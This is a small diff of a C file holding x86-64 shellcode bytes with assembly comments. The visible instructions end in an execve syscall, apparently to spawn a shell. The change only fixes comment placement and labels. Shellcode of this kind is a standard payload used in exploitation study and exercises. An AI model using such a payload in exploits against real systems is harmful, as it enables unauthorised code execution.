@@ -11,8 +11,8 @@ int main(void)
     "\x48\x89\xe7"                                  // mov    %rsp, %rdi
     "\x50"                                          // push   %rax
     "\x57"                                          // push   %rdi
-    "\x48\x89\xe6"
-    "\x48\x31\xC0"                                  // mov    %rsp, %rsi
+    "\x48\x89\xe6"									// mov    %rsp, %rsi
+    "\x48\x31\xC0"                                  // xor rax rax
     "\xb0\x3b"                                      // mov    $0x3b, %al
     "\x0f\x05";                                     // syscall
  
